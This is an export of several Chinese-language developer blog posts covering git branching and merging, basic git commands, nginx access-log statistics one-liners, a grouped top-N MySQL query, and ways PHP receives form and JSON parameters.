<h2 id="1-git-branch"><a href="#1-git-branch" class="headerlink" title="1. git branch"></a>1. git branch</h2><p>默认情况下我们都是在master分支下，我们可以使用 <strong>git branch</strong> 命令查看当前所在分支：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure>
<p>使用 <strong>-r</strong> 参数可以查看远程分支的情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git branch -r</span><br><span class="line">  origin/HEAD -&gt; origin/master</span><br><span class="line">  origin/master</span><br></pre></td></tr></table></figure>
<p>如果需要创建分支，则只需在 git branch 加上分支的名称即可，如果你想新建一个dev分支，操作如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git branch dev</span><br><span class="line">jwang@jwang:~/git_demo$ git branch</span><br><span class="line">  dev</span><br><span class="line">* master</span><br></pre></td></tr></table></figure>
<p>这里可以看到我们已经创建了一个dev分支，但是这时候我们还在master分支，并没有切换到dev分支。</p>
<h2 id="2-git-checkout"><a href="#2-git-checkout" class="headerlink" title="2. git checkout"></a>2. git checkout</h2><p>这个命令之前说过，但是在分支里面它还有另一个功能，那就是切换分支，比如如果你想切换到dev分支，用法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~&#x2F;git_demo$ git checkout dev</span><br><span class="line">Switched to branch &#39;dev&#39;</span><br><span class="line">jwang@jwang:~&#x2F;git_demo$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br></pre></td></tr></table></figure>
<p>这时候我们所有的pull，commit，push操作都是在当前dev分支，并不影响master分支，可见分支一大好处就是隔离代码，开一个分支写啥都行，不会影响其它人。</p>
<p>但是有一点需要注意，当你在dev分支使用 <strong>git push</strong> 推代码的时候你可能会遇到下面这个问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fatal: The current branch dev has no upstream branch.</span><br><span class="line">To push the current branch and set the remote as upstream, use</span><br><span class="line"></span><br><span class="line">    git push --set-upstream origin dev</span><br></pre></td></tr></table></figure>
<p>这个报错的意思是当前分支没有上游分支，什么意思呢？之前说过这个，在默认情况下，git push使用simple模式，只会把代码推送到你 <strong>git pull</strong> 拉取代码的分支上，但是这是远程服务器并没有dev分支，我们只是在本地创建了这个dev分支。</p>
<p>但是这个很容易解决，我们只需要这么做 <code>git push origin dev</code> 就可以：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git push origin dev</span><br><span class="line">Username for 'https://github.com': wangbenjun@gmail.com</span><br><span class="line">Password for 'https://wangbenjun@gmail.com@github.com': </span><br><span class="line">Counting objects: 3, done.</span><br><span class="line">Delta compression using up to 12 threads.</span><br><span class="line">Compressing objects: 100% (2/2), done.</span><br><span class="line">Writing objects: 100% (3/3), 282 bytes | 0 bytes/s, done.</span><br><span class="line">Total 3 (delta 1), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (1/1), completed with 1 local object.</span><br><span class="line">remote: </span><br><span class="line">remote: Create a pull request for 'dev' on GitHub by visiting:</span><br><span class="line">remote:      https://github.com/wangbjun/git_demo/pull/new/dev</span><br><span class="line">remote: </span><br><span class="line">To https://github.com/wangbjun/git_demo</span><br><span class="line"> * [new branch]      dev -&gt; dev</span><br></pre></td></tr></table></figure>
<p>不过为了方便以后提交代码，我们可以使用 <code>git push --set-upstream origin dev</code> 命令设置上游分支，这样我们在使用 <strong>git pull</strong>、<strong>git push</strong> 命令的时候就不会报错了，它会默认跟踪dev分支。</p>
<blockquote>
<p>第一次使用git的人会很好奇这个<strong>origin</strong>到底是啥意思？按我的理解，这个origin其实就是指远程分支，<code>git pull origin dev</code>命令就是从远程的dev分支上拉代码。当然你可以在从master或者其它分支拉取代码，不过一般不建议从其它远程分支拉代码。</p>
</blockquote>
<h2 id="3-git-merge"><a href="#3-git-merge" class="headerlink" title="3. git merge"></a>3. git merge</h2><p>当你在这个dev分支完成开发，测试也没问题了，你就需要把这个dev分支合并到master分支，这时候就需要使用merge命令，这个命令需要明白是把谁合并到谁。假如你在dev分支执行 <code>git merge master</code>，这就表示是把master分支合并到dev，最终代码在dev上。有些新手会理解错为把dev分支合并到master，这点需要注意。</p>
<p>在哪个分支上面合并都一样，你也可以在master分支上合并dev，反正最终都是一份代码，但是从项目管理的角度来说，应该先在dev分支合并master，然后再测试，因为master分支可能已经有别人提交的新的修改，你需要把这些修改合并过来。</p>
<blockquote>
<p>说到分支就不得不说到冲突，这是很多新人最害怕的事情，所谓冲突就是2个人在不同分支改动了同一行代码，这时候git就懵逼了，我到底保留哪一份呢？按提交时间先后顺序？最靠谱的方式当然是把冲突留给合并代码的人解决。</p>
</blockquote>
<p>有很多新人不知道怎么解决冲突就直接把别人写的代码覆盖掉了。。。这样的事情很常见，虽然git有历史记录，代码丢是丢不了，但是解决冲突确实是个非常棘手的事情。</p>
<p>为了解决冲突，你必须对你所写的代码了解，同时需要和另外一个修改代码的人沟通，2个人协商一下最后保留哪些代码，千万不能一意孤行。讲道理，如果一个项目结构分层合理，同时你又是经常pull代码的话，冲突是很少见的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git merge master</span><br><span class="line">Auto-merging README.md</span><br><span class="line">CONFLICT (content): Merge conflict in README.md</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>
<p>解决冲突的方式其实不不难，使用图形化界面工具最方便，如果你不使用，你只需要找到发生冲突的文件，一般内容会如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> git_demo</span></span><br><span class="line">git demo</span><br><span class="line"></span><br><span class="line">This is a Test!</span><br><span class="line"></span><br><span class="line">function add($a, $b)</span><br><span class="line">&#123;</span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">echo "This is a dev!";</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">a = add(1,2);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a);</span></span><br><span class="line">=======</span><br><span class="line">nothing to say</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; master</span></span><br></pre></td></tr></table></figure>

<p>请注意 &lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD …code… =======  …code… &gt;&gt;&gt;&gt;&gt;&gt;&gt; master 这3个标识中间的代码，其中上半段代码表示的是目前分支的代码，下半段表示的是master分支的代码。</p>
<p>你只需根据自己的需求删掉不需要的代码，保留需要的就行，比如说在这个例子里面，我只想删掉var_dump，我就可以这样改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> git_demo</span></span><br><span class="line">git demo</span><br><span class="line"></span><br><span class="line">This is a Test!</span><br><span class="line"></span><br><span class="line">function add($a, $b)</span><br><span class="line">&#123;</span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo "This is a dev!";</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">a = add(1,2);</span></span><br><span class="line"></span><br><span class="line">nothing to say</span><br></pre></td></tr></table></figure>
<p>然后重新commit就行，最后如果没问题的话push就行。</p>
<blockquote>
<p>一般情况下，如果你不解决冲突的话是不允许你push代码的，但是你可以强制push，这样就会把冲突的代码（其实就是上面带着&lt;&lt;&lt;&lt;&lt;符号的代码）push到远程分支，这样当然是不好滴，千万不要干这种坑事。</p>
</blockquote>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在实际开发中，我们一般遵循大概这样的流程，比如小A和小B现在要开始做一个项目的大功能，这个功能开发周期比较长，这时候由小A创建开发分支，小A的操作如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.小A首先切换到master分支： git checkout master</span><br><span class="line">2.然后更新代码： git pull</span><br><span class="line">3.创建功能分支： git branch -b new_feature</span><br><span class="line">4.提交分支到远程服务器供小B拉取： git push origin new_feature</span><br><span class="line">5.小B拉取功能分支： git checkout new_feature &amp;&amp; git pull</span><br><span class="line">6.期间小A和小B共同开发，不停的pull和push</span><br><span class="line">7.功能开发完成，测试完成后合并到master分支，解决可能出现的冲突</span><br><span class="line">8.切换到master分支，合并dev，最后提交代码到远程仓库，如果没问题的话就可以上线了</span><br></pre></td></tr></table></figure>
<p>这是最简单的一个分支用法，可以保证一组人在同一个分支开发，同时不会影响线上的代码。对于复杂的项目我建议可以参考 <strong>git flow</strong> 模型的用法，更加专业合理。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git最简单的基础入门教程</title>
    <url>/2018/linux/git-base-usage.html</url>
    <content><![CDATA[<p>现在很多公司都用git来管理代码，老一些的项目可能还在用svn，git比svn好的地方就在于其便利的分支管理功能，特别适用于多人协作开发，当年祖师爷linus开发git就是为了方便Linux操作系统的开发。</p>
<p>git的基本用法很简单: 拉代码、提交变更、推代码！大部分公司都有自己内部的git服务器，一般都是使用gitlab，主要是安全和省钱，当然也有公司直接使用github的付费服务！不管咋样，你都需要拿到一个项目的git地址, 为了方便演示，我在github上面创建了一个演示的仓库，里面目前只有一个README.md文件：</p>
<a id="more"></a>

<h2 id="1-git-clone"><a href="#1-git-clone" class="headerlink" title="1. git clone"></a>1. git clone</h2><p>首先，你需要使用 <strong>git clone</strong> 拷贝一份项目代码到你自己的电脑，这个命令很简单就不多说了！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ git <span class="built_in">clone</span> https://github.com/wangbjun/git_demo.git</span><br><span class="line">Cloning into <span class="string">'git_demo'</span>...</span><br><span class="line">remote: Enumerating objects: 3, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3/3), <span class="keyword">done</span>.</span><br><span class="line">Checking connectivity... <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>

<h2 id="2-git-pull"><a href="#2-git-pull" class="headerlink" title="2. git pull"></a>2. git pull</h2><p>前面那步clone代码到本地之后那就可以写你自己的代码了，不过在你提交代码前我强烈建议你先更新一下代码！而且每次开始写代码之前最好都先pull一下，这样可以减少冲突，就算有冲突也可以提前发现解决！</p>
<p>有些人长时间不pull，到最后过了很多天提交的时候一大堆冲突，根本没法merge，很坑，所以我建议大家有空就pull，绝对是没毛病的！</p>
<h2 id="3-git-status"><a href="#3-git-status" class="headerlink" title="3. git status"></a>3. git status</h2><p>改完之后当然要提交代码了，使用 <strong>git status</strong> 可以显示有哪些文件有修改！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with 'origin/master'.</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   README.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br></pre></td></tr></table></figure>
<h2 id="4-git-add"><a href="#4-git-add" class="headerlink" title="4. git add"></a>4. git add</h2><p>如果你改动了多个文件但是你只想提交其中的某几个文件，你就需要使用 <strong>git add</strong> 命令添加改动的文件，在这个例子里面，就是 <code>git add READEM.md</code>。</p>
<h2 id="4-1-git-checkout"><a href="#4-1-git-checkout" class="headerlink" title="4-1. git checkout"></a>4-1. git checkout</h2><p>如果你不想提交改动的文件，而且想撤销之前自己的更改，那你就可以使用 <strong>git checkout</strong> 命令, 在这个例子里面，就是 <code>git checkout READEM.md</code>。</p>
<h2 id="5-git-commit"><a href="#5-git-commit" class="headerlink" title="5. git commit"></a>5. git commit</h2><p>这是紧接着第4步的，假设你已经使用 <strong>git add</strong> 命令添加了自己需要提交的文件，这时候就需要使用 <strong>git commit</strong> 来提交自己的修改，通常执行这个命令会弹出一个对话框让你添加提交信息，提交信息就是相对于一个备注吧！<br><img src = "/images/old/5f6e3e27ly1fyop1wo02hj20ru0g475z.jpg" /></p>
<p>在Linux下面默认使用的是nano编辑器，很多人看到这个对话框会很懵，不知道咋用，这和vim的操作完全不一样，但也不难，直接输入你想写的内容，然后按 <strong>Ctrl+X</strong> 就会弹出一个选项，按 <strong>Y</strong>，最后回车就可以了</p>
<p>如果你实在不习惯这个编辑器，可以更改成vim，使用 <code>git config --global core.editor vim</code> 命令，如果你连vim都不会用。。。我建议你可以不用看下去了，下载一个图形化界面的工具吧，或者使用IDE也行，比如idea，eclipse都有自带git插件可以使用。</p>
<p>有一个小操作，假如你修改了很多文件，而且都需要提交，你就不必一个个 <strong>git add</strong>，跳过第4步，直接使用 <code>git commit -a</code>即可。</p>
<h2 id="6-git-push"><a href="#6-git-push" class="headerlink" title="6. git push"></a>6. git push</h2><p>最后一步，如果你只需本地使用git，这步就不需要了，但是大部分时候我们需要把自己的修改提交到远程仓库，让别人也能拉取看到，这时候我们就需要使用 <code>git push</code> 命令推代码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~/git_demo$ git push</span><br><span class="line">warning: push.default is unset; its implicit value has changed in</span><br><span class="line">Git 2.0 from 'matching' to 'simple'. To squelch this message</span><br><span class="line">and maintain the traditional behavior, use:</span><br><span class="line"></span><br><span class="line">  git config --global push.default matching</span><br><span class="line"></span><br><span class="line">To squelch this message and adopt the new behavior now, use:</span><br><span class="line"></span><br><span class="line">  git config --global push.default simple</span><br><span class="line"></span><br><span class="line">When push.default is set to 'matching', git will push local branches</span><br><span class="line">to the remote branches that already exist with the same name.</span><br><span class="line"></span><br><span class="line">Since Git 2.0, Git defaults to the more conservative 'simple'</span><br><span class="line">behavior, which only pushes the current branch to the corresponding</span><br><span class="line">remote branch that 'git pull' uses to update the current branch.</span><br><span class="line"></span><br><span class="line">See 'git help config' and search for 'push.default' for further information.</span><br><span class="line">(the 'simple' mode was introduced in Git 1.7.11. Use the similar mode</span><br><span class="line">'current' instead of 'simple' if you sometimes use older versions of Git)</span><br></pre></td></tr></table></figure>
<p>请注意上面一些提示，其大概意思是自从 git 2.0版本开始，默认使用 “simple” 模式提交代码，simple模式是只会把代码提交到你 <strong>git pull</strong> 命令拉取代码的分支。其实意思就是你从哪个分支拉取的代码就会默认push到哪个分支，一般情况下我们不需要更改这个。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>其实最常用的也就是这几个命令，<strong>git clone</strong> 只需要最开始执行一次，平时用的最多的就是 <strong>git commit</strong> 和 <strong>git push</strong>，只要掌握这几个命令就可以了。</p>
<p>当你使用IDE或者一些图形化界面工具时更简单，比如我常用的PHPStorm (idea全家桶快捷键都一样), 快捷键 <strong>Ctrl+T</strong> 就是pull，<strong>Ctrl+K</strong> 可以列出所有修改文件，默认勾选所有修改过的文件，填一下提交信息，回车就是commit了。然后 <strong>Ctrl+Shift+K</strong> 就是push代码，如果不需要修改默认设置，直接回车就行，熟练操作的话非常方便，比使用命令行的效率高很多。</p>
<img src = "/images/old/5f6e3e27ly1fyoqxam6p5j20sd0o3gpt.jpg" />

<p>使用IDE还可以非常方便的查看历史记录、reset代码、合并分支、对比代码，但是命令行也是需要掌握的，毕竟有时候在服务器上面可木有图形化界面工具。。。</p>
<p>接下来，我会继续给大家讲讲git分支相关的操作！</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx Log日志统计分析常用命令</title>
    <url>/2018/linux/nginx-log-parse.html</url>
    <content><![CDATA[<p>（网上抄的，留个记录）</p>
<p>1.统计IP访问量（独立ip访问数量）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $1&#125;&#39; access.log | sort -n | uniq | wc -l</span><br></pre></td></tr></table></figure>
<p>2.查看某一时间段的IP访问量(4-5点)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;07&#x2F;Apr&#x2F;2017:0[4-5]&quot; access.log | awk &#39;&#123;print $1&#125;&#39; | sort | uniq -c| sort -nr | wc -l</span><br></pre></td></tr></table></figure>
<p>3.查看访问最频繁的前100个IP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $1&#125;&#39; access.log | sort -n |uniq -c | sort -rn | head -n 100</span><br></pre></td></tr></table></figure>
<p>4.查看访问100次以上的IP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $1&#125;&#39; access.log | sort -n |uniq -c |awk &#39;&#123;if($1 &gt;100) print $0&#125;&#39;|sort -rn</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>5.查询某个IP的详细访问情况,按访问频率排序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &#39;127.0.0.1&#39; access.log |awk &#39;&#123;print $7&#125;&#39;|sort |uniq -c |sort -rn |head -n 100</span><br></pre></td></tr></table></figure>
<p>6.查看访问最频的页面(TOP100)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $7&#125;&#39; access.log | sort |uniq -c | sort -rn | head -n 100</span><br></pre></td></tr></table></figure>
<p>7.查看访问最频的页面([排除php页面】(TOP100)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -v &quot;.php&quot;  access.log | awk &#39;&#123;print $7&#125;&#39; | sort |uniq -c | sort -rn | head -n 100</span><br></pre></td></tr></table></figure>
<p>8.查看页面访问次数超过100次的页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat access.log | cut -d &#39; &#39; -f 7 | sort |uniq -c | awk &#39;&#123;if ($1 &gt; 100) print $0&#125;&#39; | less</span><br></pre></td></tr></table></figure>
<p>9.查看最近1000条记录，访问量最高的页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -1000 access.log |awk &#39;&#123;print $7&#125;&#39;|sort|uniq -c|sort -nr|less</span><br></pre></td></tr></table></figure>
<p>10.统计每秒的请求数,top100的时间点(精确到秒)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $4&#125;&#39; access.log |cut -c 14-21|sort|uniq -c|sort -nr|head -n 100&#39;</span><br></pre></td></tr></table></figure>
<p>11.统计每分钟的请求数,top100的时间点(精确到分钟)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $4&#125;&#39; access.log |cut -c 14-18|sort|uniq -c|sort -nr|head -n 100</span><br></pre></td></tr></table></figure>
<p>12.统计每小时的请求数,top100的时间点(精确到小时)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;&#123;print $4&#125;&#39; access.log |cut -c 14-15|sort|uniq -c|sort -nr|head -n 100</span><br></pre></td></tr></table></figure>
<p>13.性能分析,在nginx log中最后一个字段加入$request_time</p>
<p>列出传输时间超过 3 秒的页面，显示前20条</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat access.log|awk &#39;($NF &gt; 3)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure>
<p>列出php页面请求时间超过3秒的页面，并统计其出现的次数，显示前100条</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat access.log|awk &#39;($NF &gt; 1 &amp;&amp;  $7~&#x2F;\.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure>
<p>14.统计蜘蛛抓取次数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &#39;Baiduspider&#39; access.log |wc -l</span><br></pre></td></tr></table></figure>
<p>15.统计蜘蛛抓取404的次数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &#39;Baiduspider&#39; access.log |grep &#39;404&#39; | wc -l</span><br></pre></td></tr></table></figure>
<p>16.TCP连接统计,查看当前TCP连接数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tan | grep &quot;ESTABLISHED&quot; | grep &quot;:80&quot; | wc -l</span><br></pre></td></tr></table></figure>
<p>17.用tcpdump嗅探80端口的访问看看谁最高</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &#39;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#39; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>解决MySQL分组排序求最值问题</title>
    <url>/2018/coding/mysql-group-orderby.html</url>
    <content><![CDATA[<p>首先，先明确一下问题，所谓求分组的最值意思的就是在sql里面使用group by之后，每个分组有多条数据，我们要根据一定条件取其中最大的一条或者多条！</p>
<p>先看一个数据表 blogs 结构，简单说一下，cat_id 就是分类ID，可以看到一个分类有多条记录：</p>
<img src="/images/old/3571187-8d13727754425021.jpg" />

<p>举个非常典型的问题:</p>
<p>1.求某个分类ID下，查看次数最多的3条数据？这个问题很简单，基本上大家都能写出来这样的sql:</p>
<a id="more"></a>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> blogs <span class="keyword">where</span> cat_id = $cat_id <span class="keyword">order</span> <span class="keyword">by</span> view_num <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>2.求多个分类ID下，查看次数最多的3条数据呢？这个问题就在于求多个，也就是我要批量查询，不能一个个查，有很多人图省事就直接for循环一个个查了,如果说只有几个ID这样做还可以，如果有几十个这样的数据就意味着几十次的查库操作，对性能影响还是挺大的，所以必须想办法！</p>
<p>sql如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SUBSTRING_INDEX(<span class="keyword">GROUP_CONCAT</span>(cat_id,<span class="string">'-'</span>,<span class="keyword">id</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> view_num),<span class="string">','</span>,<span class="number">3</span>) <span class="keyword">from</span> blogs <span class="keyword">where</span> cat_id <span class="keyword">in</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>) <span class="keyword">GROUP</span> <span class="keyword">BY</span> cat_id</span><br></pre></td></tr></table></figure>
<p>这条语句看上去比较复杂，不要慌，SUBSTRING_INDEX 是内置函数，功能类似于PHP里面的 substr，在这意思是取前3个数据，重点是 group_concat, 这个函数很多人都用过，但是我估计很多人都不知道后面还可以写 order by，所以这条sql的意思就是在每个分组里面排序取前3个。</p>
<p>但是取出来的数组格式并不好看，是以 cat_id-id 这种形式取出来的，可以看到有多个：</p>
<img src="/images/old/3571187-f5ba49d28a69e01a.jpg" />

<p>后面的操作只能拿到代码里面处理了，可能需要循环取出所有id，然后批量获取数据，最后再拼接出来想要的数据！虽然比较麻烦，在代码里面需要多出很多次for循环操作，但是相比于多查几十次库，这点代码运行开销还是很小的！</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈PHP前后端传参常见的几种方式</title>
    <url>/2017/coding/php/php-form-pass-method.html</url>
    <content><![CDATA[<p>在Web开发里面，有前后端之分，它们之间的交互主要通过传参的方式，但是这个传参也分几种形式，比如说Form表单提交、Ajax提交…今天我就在这里总结一下开发中常见的几种形式：</p>
<h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>这种方式是最原始最常见的方式，提交的时候也有可能是通过js触发，其请求头Content-Type为: application/x-www-form-urlencoded，示例如下：</p>
<h3 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;backend.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;name&quot;&gt;姓名:&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot;&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;name&quot;&gt;年龄:&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;age&quot; name&#x3D;&quot;age&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="后端接收"><a href="#后端接收" class="headerlink" title="后端接收"></a>后端接收</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST[&#39;name&#39;]);</span><br><span class="line">var_dump($_GET[&#39;age&#39;]);</span><br><span class="line">var_dump($_REQUEST[&#39;age]);</span><br></pre></td></tr></table></figure>
<h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><img src = "/images/old/3571187-3b1aa32292a0f9e5.png" />

<p>这种提交方式也是ajax默认的提交方式,请求参数是以key-value键值对的形式传递到后端,在PHP里面通$_POST等超全局变量就可以获取到,简单实用。其未经解析的原始的数据其实是：name=PHP&amp;age=25</p>
<img src = "/images/old/3571187-c2d0236765996437.png" />

<h2 id="2-JSON形式提交"><a href="#2-JSON形式提交" class="headerlink" title="2. JSON形式提交"></a>2. JSON形式提交</h2><p>这种形式，需要设置一下请求头Content-Type为application/json，实例如下：</p>
<h3 id="前端代码-1"><a href="#前端代码-1" class="headerlink" title="前端代码"></a>前端代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    type: &#39;POST&#39;,</span><br><span class="line">    url: &quot;backend.php&quot;,</span><br><span class="line">    data: &#123;</span><br><span class="line">        &#39;name&#39;: &#39;hello&#39;,</span><br><span class="line">        &#39;age&#39;: 15,</span><br><span class="line">    &#125;,</span><br><span class="line">    contentType: &#39;application&#x2F;json&#39;,</span><br><span class="line">    dataType: &quot;json&quot;,</span><br><span class="line">    success: function (data) &#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="请求头-1"><a href="#请求头-1" class="headerlink" title="请求头"></a>请求头</h3><img src = "/images/old/3571187-cbf271fe3dd4bad7.png" />

<p>从上面的截图可以看到，请求参数那里变成Request Payload，虽然格式上看上去和之前form提交差不多，但是这时候如果后台用$_POST这类方法是无法获取的，需要换一种方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$input &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br></pre></td></tr></table></figure>
<p>上面这种方式获取到的内容是字符串: name=Jun&amp;age=15，在这个例子里面反而不容易处理了，实际上采用json这种方式提交的参数的话，一般都是把需要的数据封装成json格式提交，在js里面就是把数据放到对象里面，然后序列化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var data &#x3D; &#123;</span><br><span class="line">    &#39;name&#39;: &#39;Jun&#39;,</span><br><span class="line">    &#39;age&#39;: 15,</span><br><span class="line">&#125;;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    type: &#39;POST&#39;,</span><br><span class="line">    url: &quot;backend.php&quot;,</span><br><span class="line">    data: JSON.stringify(data),</span><br><span class="line">    contentType: &#39;application&#x2F;json&#39;,</span><br><span class="line">    dataType: &quot;json&quot;,</span><br><span class="line">    success: function (data) &#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这是再查看请求头：</p>
<img src = "/images/old/3571187-7f20f6b265d2e8bf.png" />

<p>可以看到参数变成json格式，这时候PHP后端就可以采用json_decode函数去获取参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$input &#x3D; json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;), true);</span><br></pre></td></tr></table></figure>

<h2 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h2><blockquote>
<p>一般上传图片等各种文件的时候用的到，Content-Type是 multipart/form-data</p>
</blockquote>
<p>请求头类似如下：</p>
